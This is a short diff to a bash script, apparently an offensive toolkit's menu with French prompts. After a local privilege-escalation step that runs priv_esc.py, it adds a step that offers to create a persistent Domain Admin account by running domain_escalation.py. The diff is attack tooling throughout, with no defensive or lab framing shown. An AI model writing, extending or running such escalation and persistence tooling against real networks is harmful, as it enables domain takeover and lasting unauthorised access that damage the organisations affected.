@@ -34,4 +34,11 @@ read -p "[?] Voulez-vous tenter une élévation de privilège locale ? (y/N) : "
 if [[ "$elevate" =~ ^[Yy]$ ]]; then
     echo "[+] Lancement de l'escalade locale de privilèges..."
     python3 priv_esc.py
+
+    # Étape 6 : Proposer création de compte Domain Admin
+    read -p "[?] Créer un compte Domain Admin persistant ? (y/N) : " create_admin
+    if [[ "$create_admin" =~ ^[Yy]$ ]]; then
+        echo "[+] Lancement de la création du compte Domain Admin..."
+        python3 domain_escalation.py
+    fi
 fi
